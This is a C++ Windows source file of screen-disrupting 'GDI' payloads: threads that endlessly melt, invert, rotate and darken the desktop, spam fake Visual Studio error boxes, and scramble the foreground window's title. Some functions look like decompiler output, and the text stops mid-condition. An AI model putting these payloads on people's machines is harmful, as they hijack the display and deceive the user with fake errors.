/*
MIT License

Copyright (c) 2024 UltimateQuack

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "stuff.h"
#include "bytebeat.cpp"
#include <windows.h>
#include <windowsx.h>

#include "modules/INIReader.h" // reads the .INI file to check some settings
//#include <iostream>
#include <sstream>

#include <Mmsystem.h>
#include <mciapi.h>
//these two headers are already included in the <Windows.h> header


#include "final.cpp"
#include "extras.cpp"

#pragma comment(lib, "winmm.lib")

#pragma comment( user, "Compiled on " __DATE__ " at " __TIME__ )

std::string sections(INIReader &reader) {
  std::stringstream ss;
  std::set<std::string> sections = reader.Sections();
  for (std::set<std::string>::iterator it = sections.begin();
       it != sections.end(); ++it)
    ss << *it << ",";
  return ss.str();
}

INIReader reader("config.ini");

DWORD random() {
	DWORD number = __rdtsc();
	
	number ^= number << 13;
	number ^= number << 17;
	number ^= number << 5;

	return number;
}

void WINAPI Reset() {
	waveOutReset(wave);
	wave = 0;
}



// Add this function near the top of your file, after the includes
std::wstring getRandomImageFile() {
    const std::array<std::wstring, 4> imageFiles = {
        L"./res/ded.bmp",
        L"./res/dedMac.bmp",
        L"./res/code1.bmp",
        L"./res/XD.bmp"
    };

    int randomIndex = random() % imageFiles.size();
    return imageFiles[randomIndex];
}

// Then, modify the ded function to use this new function:
void WINAPI ded(LPVOID lpVoid) {
    while (true) {
        HANDLE thread;
        DWORD ID;

        Sleep(random() % 50000);
        RECT rect;
        HDC hdc = GetDC(0);

        std::wstring randomImageFile = getRandomImageFile();
        HBRUSH brush = CreatePatternBrush((HBITMAP)LoadImage(NULL, randomImageFile.c_str(), IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE));
        GetWindowRect(GetDesktopWindow(), &rect);
        FillRect(hdc, &rect, brush);
        DeleteObject(brush);
        ReleaseDC(GetDesktopWindow(), hdc);
    }
}

void WINAPI REALded(LPVOID lpVoid) {
    // consider it as an ded v2

    HBRUSH brush = CreatePatternBrush((HBITMAP)LoadImage(NULL, L"./res/finale.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE));

    HANDLE thread;
    DWORD ID;

    RECT rect;
    HDC hdc = GetDC(0);

    while (true) {
        GetWindowRect(GetDesktopWindow(), &rect);
        FillRect(hdc, &rect, brush);
        DeleteObject(brush);
        ReleaseDC(GetDesktopWindow(), hdc);
        Sleep(1);

    }
}


VOID WINAPI ci(int x, int y, int w, int h) // https://github.com/pankoza2-pl/GDI-and-Bytebeats/blob/main/I_Am_a_potato/Main.cpp
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
    DeleteObject(hrgn);
    ReleaseDC(NULL, hdc);
}
DWORD WINAPI fun1(LPVOID lpVoid) // https://github.com/pankoza2-pl/GDI-and-Bytebeats/blob/main/I_Am_a_potato/Main.cpp
{
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;

    for (int t = 0;; t++)
    {
        const int size = 1000;
        int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;

        for (int i = 0; i < size; i += 100)
        {
            ci(x - i / 2, y - i / 2, i, i);
        }
    }
    //return 0x00;
}
DWORD WINAPI fun2(LPVOID lpVoid) // https://github.com/pankoza2-pl/GDI-and-Bytebeats/blob/main/I_Am_a_potato/Main.cpp
{
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    for (int t = 0;; t++)
    {
        HDC hdc = GetDC(0);
        BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
        BitBlt(hdc, 
            rand() % 25, 
            rand() % 25,
            w, 
            h, 
            hdc, 
            rand() % 25,
            rand() % 25,
            NOTSRCERASE
        );
        HPEN hPen = CreatePen(PS_SOLID, 2, RGB(rand() % 256, rand() % 256, rand() % 256));
        //HPEN hOldPen = SelectPen(hdc, hPen);
        HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
        //HBRUSH hOldBrush = SelectBrush(hdc, hBrush);
        POINT vertices[] = { 
            {
                rand() % w, 
                rand() % h
            }, 
            {
                rand() % w, 
                rand() % h
            }, 
            {
                rand() % w, 
                rand() % h
            } 
        };
        Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));
        //SelectBrush(hdc, hOldBrush);
        DeleteObject(hBrush);
        //SelectPen(hdc, hOldPen);
        DeleteObject(hPen);
        ReleaseDC(0, hdc);
    }
    //return 0x00;
}
DWORD WINAPI fun3(LPVOID lpVoid) { // https://github.com/pankoza2-pl/GDI-and-Bytebeats/blob/main/I_Am_a_potato/Main.cpp
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    while (1) {
        HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;
        int top_x = 0 + x;
        int top_y = 0 + y;
        int bottom_x = 100 + x;
        int bottom_y = 100 + y;
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
        if (y >= GetSystemMetrics(SM_CYSCREEN)){signY = -1;}
        if (x >= GetSystemMetrics(SM_CXSCREEN)){signX = -1;}

        if (y == 0){signY = 1;}
        if (x == 0){signX = 1;}

        Sleep(1);
        DeleteObject(brush);
        brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, 0x1900ac010e);
        BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, 0x1900ac010e);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, 0x1900ac010e);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, 0x1900ac010e);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI fun4(LPVOID lpVoid) // https://github.com/pankoza2-pl/GDI-and-Bytebeats/blob/main/I_Am_a_potato/Main.cpp
{
    while (1) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN),
            h = GetSystemMetrics(SM_CYSCREEN),
            rx = rand() % w;
        BitBlt(hdc,
            rand() % 25,
            rand() % 25,
            w,
            h,
            hdc,
            rand() % 25,
            rand() % 25,
            NOTSRCERASE
        );
        BitBlt(hdc, rx, 10, 100, h, hdc, rx, 0, SRCCOPY);
        HPEN hPen = CreatePen(PS_SOLID, 2, RGB(rand() % 256, rand() % 256, rand() % 256));
        //HPEN hOldPen = SelectPen(hdc, hPen);
        HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
        //HBRUSH hOldBrush = SelectBrush(hdc, hBrush);
        POINT vertices[] = {
            {
                rand() % w,
                rand() % h
            },
            {
                rand() % w,
                rand() % h
            },
            {
                rand() % w,
                rand() % h
            }
        };
        Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));
        //SelectBrush(hdc, hOldBrush);
        DeleteObject(hBrush);
        //SelectPen(hdc, hOldPen);
        DeleteObject(hPen);
        ReleaseDC(0, hdc);
    }
    //return 0x00;
}

/////////////////////////////////////////////////////////////////////////////////

DWORD WINAPI FakeError(LPVOID lpstart) {
		MessageBoxA(0, "IndexError: list assignment index out of range", "Visual Studio Community 2017: Compilation Error!",  MB_ABORTRETRYIGNORE | MB_ICONERROR);
	return 0x00;
}

DWORD WINAPI FakeErrorSpam(LPVOID lpstart) {
	HANDLE thread;
	DWORD ID;

    Sleep(random() % 30 );
	thread = CreateThread(0, 0, FakeError, 0, 0, &ID);
    return 0x00;
}

DWORD WINAPI Dark(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		for (int ys = 0; ys < y; ys += 12) {
			StretchBlt(hdc, 0, 0, x, ys, hdc, 0, 0, 1, 1, SRCAND);
		}
	}
}

DWORD WINAPI Cursors(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);
	CURSORINFO cur;

	while (true) {
		int xs = 0;
		int ys = 0;
		int sel = random() % 4 + 1;

		if (sel == 1) {
			xs = random() % x;

			for (; ys < y; ys += 2) {
				cur.cbSize = sizeof(cur);
				GetCursorInfo(&cur);

				DrawIcon(hdc, xs, ys, cur.hCursor);
				xs += sin(xs) * 2;
				if (xs >= x) {
					ys = y;
				}
				//Sleep(1);
			}
		}
		else if (sel == 2) {
			xs = random() % x;
			ys = GetSystemMetrics(SM_CYSCREEN);

			for (; ys > 0; ys -= 2) {
				cur.cbSize = sizeof(cur);
				GetCursorInfo(&cur);

				DrawIcon(hdc, xs, ys, cur.hCursor);
				xs += 2;
				if (xs >= x) {
					ys = 0;
				}
				Sleep(1);
			}
		}
		else if (sel == 3) {
			xs = random() % x;

			for (; ys < y; ys += 2) {
				cur.cbSize = sizeof(cur);
				GetCursorInfo(&cur);

				DrawIcon(hdc, xs, ys, cur.hCursor);
				xs -= 2;
				if (xs <= 0) {
					ys = y;
				}
				Sleep(1);
			}
		}
		else if (sel == 4) {
			xs = random() % x;
			ys = GetSystemMetrics(SM_CYSCREEN);

			for (; ys > 0; ys -= 2) {
				cur.cbSize = sizeof(cur);
				GetCursorInfo(&cur);

				DrawIcon(hdc, xs, ys, cur.hCursor);
				xs -= 2;
				if (xs <= 0) {
					ys = 0;
				}
				Sleep(1);
			}
		}
	}
}


DWORD WINAPI RGBCircle(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	int xs = random() % x;
	int ys = random() % y;

	HBRUSH circle = CreateSolidBrush(RGB(255, 0, 0));
	HPEN border = CreatePen(0, 1, RGB(255, 255, 255));

	int color = 0;

	while (true) {
		if (color == 1) {circle = CreateSolidBrush(RGB(random() % 255, random() % 165, 0));}
		else if (color == 2) {circle = CreateSolidBrush(RGB(random() % 255, random() % 255, 0));}
		else if (color == 3) {circle = CreateSolidBrush(RGB(0, random() % 255, 0));}
		else if (color == 4) {circle = CreateSolidBrush(RGB(0, random() % 255, random() % 255));}
		else if (color == 5) {circle = CreateSolidBrush(RGB(0, 0, random() % 255));}
		else if (color == 6) {circle = CreateSolidBrush(RGB(random() % 148, 0, random() % 211));}
		else if (color == 7) {circle = CreateSolidBrush(RGB(random() % 255, 0, random() % 255));}
		else if (color == 8) {circle = CreateSolidBrush(RGB(random() % 255, 0, 0));color = 0;}

		SelectObject(hdc, circle);
		SelectObject(hdc, border);
		
		if (xs >= x) {xs = random() % x;ys = random() % y;}
		else if (ys >= y) {xs = random() % x;ys = random() % y;}
		else if (xs <= 0) {xs = random() % x;ys = random() % y;}
		else if (ys <= 0) {xs = random() % x;ys = random() % y;}

		//int sel = random() % 4 + 1;

		for (int runtime = 0; runtime < 100; runtime++) {
			//if (sel == 1 || sel == 2 || sel == 3 || sel == 4) {
				Ellipse(hdc, xs + 7, ys + 7, xs + 7, ys + 7);
				xs += 10 * sin(xs); // omg math :0
				ys += 10 * cos(ys);
				Sleep(10);
			//}
		}
		color++;
	}
}

DWORD WINAPI IconWave(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	double i;
	double wave;
	int xs;
	int ys;

	while (true) {
		int sel = random() % 4 + 1;
		wave = 0;
		i = 0;

		if (sel == 1) {
			xs = 0;
			ys = random() % y;

			for (; xs < x; xs += 3) {
				DrawIcon(hdc, xs, ys + wave * cos(i), LoadIconW(0, IDI_ERROR));
				i += 0.05;
				wave += i + 0.32;
				Sleep(1); // too small value ngl
			}
		}
		else if (sel == 2) {
			xs = x;
			ys = random() % y;

			for (; xs > 0; xs -= 3) {
				DrawIcon(hdc, xs, ys + wave * cos(i), LoadIconW(0, IDI_WARNING));
				i += 0.05;
				wave += i + 0.32;
				Sleep(1);
			}
		}
		else if (sel == 3) {
			xs = random() % x;
			ys = 0;

			for (; ys < y; ys += 3) {
				DrawIcon(hdc, xs + wave * cos(i), ys, LoadIconW(0, IDI_INFORMATION));
				i += 0.05;
				wave += i + 0.32;
				Sleep(1);
			}
		}
		else if (sel == 4) {
			xs = random() % x;
			ys = y;

			for (; ys > 0; ys -= 3) {
				DrawIcon(hdc, xs + wave * cos(i), ys, LoadIconW(0, IDI_QUESTION));
				i += 0.05;
				wave += i + 0.32;
				Sleep(1);
			}
		}
	}
}

DWORD WINAPI Sinewave(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	double i = 0;

	while (true) {
		for (int ys = 0; ys < y; ys++) {
			BitBlt(hdc, 8 * sin(i), ys, x, 1, hdc, 0, ys, SRCCOPY);
			i += 0.04;
		}
		Sleep(40);
	}
}

DWORD WINAPI Shake(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	double shit = 0; // idfc about if i shoul use int or double

	while (true) {
		// POSTIVE (um número normal q n tem "-" já é positivo)

		BitBlt(hdc, shit, shit, x, y, hdc, 0, 0, SRCCOPY);
		Sleep(1000 / shit); // the bigger i is, the faster it will be
		shit += 1 * (shit / 5);

		// NEGATIVE (eu descrobri que em quase todas as lilnguagems se tu por)
		// "-" antes de uma variavel ela vira negativa (ex i -> -i)

		BitBlt(hdc, -shit, -shit, x, y, hdc, 0, 0, SRCCOPY);
		Sleep(1000 / shit); // the bigger i is, the faster it will be
		shit += 1 * (shit / 5);
	}
}

DWORD WINAPI Dark2(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		BitBlt(hdc, random() % 2, random() % 2, x, y, hdc, random() % 2, random() % 2, SRCAND);
		//Sleep(130);
	}
}

DWORD WINAPI Melter(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		int xs = random() % x;
		int ys = random() % y;
		int sel = random() % 4 + 1;
		int size = random() % 300 + 200;
		int rnd = random() % 50 + 30;

		if (sel == 1) {for (int i = 0; i < rnd; i += 10) {BitBlt(hdc, xs + i, ys + i, size + xs, size + ys, hdc, xs, ys, SRCCOPY);Sleep(1);}}
		else if (sel == 2) {for (int i = 0; i < rnd; i += 10) {BitBlt(hdc, xs + i, ys - i, size + xs, size + ys, hdc, xs, ys, SRCCOPY);Sleep(1);}}
		else if (sel == 3) {for (int i = 0; i < rnd; i += 10) {BitBlt(hdc, xs - i, ys + i, size + xs, size + ys, hdc, xs, ys, SRCCOPY);Sleep(1);}}
		else if (sel == 4) {for (int i = 0; i < rnd; i += 10) {BitBlt(hdc, xs - i, ys - i, size + xs, size + ys, hdc, xs, ys, SRCCOPY);Sleep(1);}}
	}
}

DWORD WINAPI Trails(LPVOID lpstart) {
	HDC hdc = GetDC(0);
	POINT curpos;
	CURSORINFO cur;

	while (true) {
		GetCursorPos(&curpos);
		cur.cbSize = sizeof(cur);
		GetCursorInfo(&cur);

		DrawIcon(hdc, curpos.x + random(), curpos.y + random(), cur.hCursor);
		Sleep(10);
	}
}


DWORD WINAPI Melter2(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		BitBlt(hdc, random() % 2, random() % 2, random() % x, random() % y, hdc, random() % 2, random() % 2, SRCCOPY);
	}
}


DWORD WINAPI Rotate(LPVOID lpstart) {
	HDC hdc = GetDC(0);
	RECT rekt;
	POINT rotate[3];

	while (true) {
		int rnd = random() % 65 + 60;

		for (int i = 0; i < rnd; i += 20) {
			GetWindowRect(GetDesktopWindow(), &rekt);

			rotate[0].x = rekt.left + i;
			rotate[0].y = rekt.top - i;
			rotate[1].x = rekt.right + i;
			rotate[1].y = rekt.top + i;
			rotate[2].x = rekt.left - i;
			rotate[2].y = rekt.bottom - i;

			PlgBlt(hdc, rotate, hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
			Sleep(40);
		}
		for (int i = 0; i < rnd; i += 20) {
			GetWindowRect(GetDesktopWindow(), &rekt);

			rotate[0].x = rekt.left - i;
			rotate[0].y = rekt.top + i;
			rotate[1].x = rekt.right - i;
			rotate[1].y = rekt.top - i;
			rotate[2].x = rekt.left + i;
			rotate[2].y = rekt.bottom + i;

			PlgBlt(hdc, rotate, hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
			Sleep(10);
		}
	}
}

DWORD WINAPI Rainbow(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		HBRUSH brush = CreateSolidBrush(RGB(random() % 255, random() % 255, random() % 255));
		SelectObject(hdc, brush);

		PatBlt(hdc, 0, 0, x, y, PATINVERT);
		Sleep(random() % 200 + 130);
	}
}


DWORD WINAPI Melter3(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		int ys = random() % y;
		int size = random() % 80 + 50;

		if (random() % 2 + 1 == 1) {
			for (int i = 0; i < 5; i++) {
				BitBlt(hdc, i, ys, x, size, hdc, 0, ys, SRCCOPY);
			}
		}
		else {
			for (int i = 0; i < 5; i++) {
				BitBlt(hdc, -i, ys, x, size, hdc, 0, ys, SRCCOPY);
			}
		}
	}
}

DWORD WINAPI Colors(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		int color = (random() % 2) ? 0x666666 : 0x999999;
//									   funni	  funni

		BitBlt(hdc, 1, 1, x, y, hdc, 0, 0, color);Sleep(1);
		BitBlt(hdc, -1, 1, x, y, hdc, 0, 0, color);Sleep(1);
		BitBlt(hdc, 1, -1, x, y, hdc, 0, 0, color);Sleep(1);
		BitBlt(hdc, -1, -1, x, y, hdc, 0, 0, color);Sleep(1);
	}
}

DWORD WINAPI Flip(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		StretchBlt(hdc, 0, 0, x, y, hdc, x, 0, -x, y, SRCCOPY);Sleep(1);
		StretchBlt(hdc, 0, 0, x, y, hdc, 0, y, x, -y, SRCCOPY);Sleep(1);
	}
}

DWORD WINAPI CircleSquare(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		int xs = random() % x;
		int ys = random() % y;

		int rnd = random() % 600 + 500;

		if (random() % 2 + 1 == 1) {
			for (int i = 0; i < rnd; i += 30) {
				HRGN circle = CreateEllipticRgn(xs - i, ys - i, xs + i, ys + i);
				SelectClipRgn(hdc, circle);

				BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, NOTSRCCOPY);Sleep(1);
			}
		}
		else {
			for (int i = 0; i < rnd; i += 30) {
				HRGN square = CreateRectRgn(xs - i, ys - i, xs + i, ys + i);
				SelectClipRgn(hdc, square);

				BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, NOTSRCCOPY);Sleep(1);
			}
		}
		Sleep(1);
	}
}

DWORD WINAPI Bright(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		int xs = random() % x;
		BitBlt(hdc, xs, 0, 100, y, hdc, xs, random() % 14 + -5, SRCPAINT);
	}
}

DWORD WINAPI ExtremeRotation(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	RECT rekt;
	POINT rotate[3];

	while (true) {
		if (random() % 2 + 1 == 1) {
			for (int runtime = 0; runtime < 30; runtime++) {
				GetWindowRect(GetDesktopWindow(), &rekt);

				rotate[0].x = rekt.left + 90;
				rotate[0].y = rekt.top - 90;
				rotate[1].x = rekt.right + 90;
				rotate[1].y = rekt.top + 90;
				rotate[2].x = rekt.left - 90;
				rotate[2].y = rekt.bottom - 90;

				PlgBlt(hdc, rotate, hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
			}
		}
		else {
			for (int runtime = 0; runtime < 30; runtime++) {
				GetWindowRect(GetDesktopWindow(), &rekt);

				rotate[0].x = rekt.left - 90;
				rotate[0].y = rekt.top + 90;
				rotate[1].x = rekt.right - 90;
				rotate[1].y = rekt.top - 90;
				rotate[2].x = rekt.left + 90;
				rotate[2].y = rekt.bottom + 90;

				PlgBlt(hdc, rotate, hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
			}
		}
	}
}

DWORD WINAPI Cubes(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	int ys = 0;

	while (true) {
		HBRUSH brush = CreateSolidBrush(RGB(random() % 255, random() % 255, random() % 255));
		SelectObject(hdc, brush);

		for (int i = 0; i < x; i += 100) {
			Rectangle(hdc, i, ys + 100, 100 + i, ys);
			Sleep(10);
		}

		ys += 100;
		if (ys >= y) {
			ys = 0;
		}

		Sleep(30);
	}
}

DWORD WINAPI Invert(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, NOTSRCCOPY);
	}
}

DWORD WINAPI gdi1(LPVOID lpParam)
{
    SetProcessDPIAware();
    int wDest;
    int iVar1;
    HDC hdcDest;
    int hDest;

    wDest = GetSystemMetrics(0);
    iVar1 = GetSystemMetrics(1);
    hdcDest = GetDC((HWND)0x0);
    do {
        do {
            hDest = 0;
        } while (iVar1 < 1);
        do {
            StretchBlt(hdcDest, 0, 0, wDest, hDest, hdcDest, 0, 0, 1, 1, 0x8800c6);
            Sleep(1);
            hDest = hDest + 6;
        } while (hDest < iVar1);
    } while (true);
}
DWORD WINAPI gdi2(LPVOID lpParam)
{
        ULONGLONG uVar1;
        DWORD64 uVar2;
        UINT uVar3;
        int iVar4;
        HDC hDC;
        UINT uVar5;
        int iVar6;
        int iVar7;
        tagCURSORINFO local_1c;
     
        uVar3 = GetSystemMetrics(0);
        iVar4 = GetSystemMetrics(1);
        hDC = GetDC((HWND)0x0);
        do {
            do {
                while (true) {
                    while (true) {
                        uVar1 = __rdtsc();
                        iVar7 = 0;
                        uVar5 = (UINT)uVar1 & 3;
                        if ((uVar1 & 3) != 0) break;
                        uVar2 = __rdtsc();
                        uVar5 = (UINT)uVar2 ^ (UINT)uVar2 << 0xd;
                        uVar5 = uVar5 ^ uVar5 << 0x11;
                        uVar5 = (uVar5 << 5 ^ uVar5) % uVar3;
                        if (0 < iVar4) {
                            do {
                                local_1c.cbSize = 0x14;
                                GetCursorInfo(&local_1c);
                                DrawIcon(hDC, uVar5, iVar7, local_1c.hCursor);
                                uVar5 = uVar5 + 2;
                                if ((int)uVar3 <= (int)uVar5) {
                                    iVar7 = iVar4;
                                }
                                Sleep(1);
                                iVar7 = iVar7 + 2;
                            } while (iVar7 < iVar4);
                        }
                    }
                    if (uVar5 == 1) break;
                    if (uVar5 == 2) {
                        uVar2 = __rdtsc();
                        uVar5 = (UINT)uVar2 ^ (UINT)uVar2 << 0xd;
                        uVar5 = uVar5 ^ uVar5 << 0x11;
                        uVar5 = (uVar5 << 5 ^ uVar5) % uVar3;
                        if (0 < iVar4) {
                            do {
                                local_1c.cbSize = 0x14;
                                GetCursorInfo(&local_1c);
                                DrawIcon(hDC, uVar5, iVar7, local_1c.hCursor);
                                uVar5 = uVar5 - 2;
                                if ((int)uVar5 < 1) {
                                    iVar7 = iVar4;
                                }
                                Sleep(1);
                                iVar7 = iVar7 + 2;
                            } while (iVar7 < iVar4);
                        }
                    }
                    else if (uVar5 == 3) {
                        uVar2 = __rdtsc();
                        uVar5 = (UINT)uVar2 ^ (UINT)uVar2 << 0xd;
                        uVar5 = uVar5 ^ uVar5 << 0x11;
                        uVar5 = (uVar5 << 5 ^ uVar5) % uVar3;
                        iVar7 = GetSystemMetrics(1);
                        while (0 < iVar7) {
                            local_1c.cbSize = 0x14;
                            GetCursorInfo(&local_1c);
                            DrawIcon(hDC, uVar5, iVar7, local_1c.hCursor);
                            uVar5 = uVar5 - 2;
                            Sleep(1);
                            iVar6 = 0;
                            if (0 < (int)uVar5) {
                                iVar6 = iVar7;
                            }
                            iVar7 = iVar6 + -2;
                        }
                    }
                }
                uVar2 = __rdtsc();
                uVar5 = (UINT)uVar2 ^ (UINT)uVar2 << 0xd;
                uVar5 = uVar5 ^ uVar5 << 0x11;
                uVar5 = (uVar5 << 5 ^ uVar5) % uVar3;
                iVar7 = GetSystemMetrics(1);
            } while (iVar7 < 1);
            do {
                local_1c.cbSize = 0x14;
                GetCursorInfo(&local_1c);
                DrawIcon(hDC, uVar5, iVar7, local_1c.hCursor);
                uVar5 = uVar5 + 2;
                Sleep(1);
                if ((int)uVar3 <= (int)uVar5) break;
                iVar7 = iVar7 + -2;
            } while (0 < iVar7);
        } while (true);
}
DWORD WINAPI gdi3(LPVOID lpParam)
{
    int uVar1;
    HWND hWnd;
    int iVar2;
    uint uVar3;
    CHAR* lpString;
    CHAR local_9;

    do {
        iVar2 = 0;
        do {
            uVar1 = rdtsc();
            uVar3 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
            uVar3 = uVar3 ^ uVar3 << 0x11;
            (&local_9)[iVar2] = (CHAR)((ulonglong)(uVar3 << 5 ^ uVar3) % 0x47);
            iVar2 = iVar2 + 1;
        } while (iVar2 < 0x46);
        lpString = &local_9;
        hWnd = GetForegroundWindow();
        SetWindowTextA(hWnd, lpString);
        Sleep(1000);
    } while (true);
}
DWORD WINAPI gdi4(LPVOID lpParam)
{
    int uVar1;
    ulonglong uVar2;
    uint uVar3;
    uint uVar4;
    HDC hdc;
    HPEN h;
    int right;
    uint uVar5;
    int top;
    int bottom;
    int left;
    int local_28;
    int local_1c;
    HBRUSH local_14;
    int local_10;
    uint local_c;
    uint local_8;

    uVar3 = GetSystemMetrics(0);
    uVar4 = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    uVar1 = rdtsc();
    uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
    uVar5 = uVar5 ^ uVar5 << 0x11;
    local_8 = (uVar5 << 5 ^ uVar5) % uVar3;
    uVar1 = rdtsc();
    uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
    uVar5 = uVar5 ^ uVar5 << 0x11;
    local_c = (uVar5 << 5 ^ uVar5) % uVar4;
    local_14 = CreateSolidBrush(0xff);
    h = CreatePen(0, 2, 0xffffff);
    local_28 = 0;
    do {
        if (local_28 == 1) {
            local_14 = CreateSolidBrush(0xa5ff);
        }
        else if (local_28 == 2) {
            local_14 = CreateSolidBrush(0xffff);
        }
        else if (local_28 == 3) {
            local_14 = CreateSolidBrush(0xff00);
        }
        else if (local_28 == 4) {
            local_14 = CreateSolidBrush(0xffff00);
        }
        else if (local_28 == 5) {
            local_14 = CreateSolidBrush(0xff0000);
        }
        else if (local_28 == 6) {
            local_14 = CreateSolidBrush(0xd30094);
        }
        else if (local_28 == 7) {
            local_14 = CreateSolidBrush(0xff00ff);
        }
        else if (local_28 == 8) {
            local_14 = CreateSolidBrush(0xff);
            local_28 = 0;
        }
        SelectObject(hdc, local_14);
        SelectObject(hdc, h);
        if (((((int)uVar3 <= (int)local_8) || ((int)uVar4 <= (int)local_c)) || ((int)local_8 < 1)) ||
